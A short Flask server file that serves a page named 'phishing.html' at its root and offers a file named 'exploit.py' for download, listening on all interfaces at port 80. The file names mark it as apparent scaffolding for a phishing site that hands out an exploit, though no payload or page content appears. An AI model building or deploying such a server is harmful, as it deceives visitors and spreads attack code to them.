from flask import Flask, request, render_template, send_from_directory
import os
import json

app = Flask(__name__, template_folder='Templates')

@app.route('/')
def index():
    return render_template('phishing.html')

@app.route('/exploit')
def exploit():
    return send_from_directory('static', 'exploit.py')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)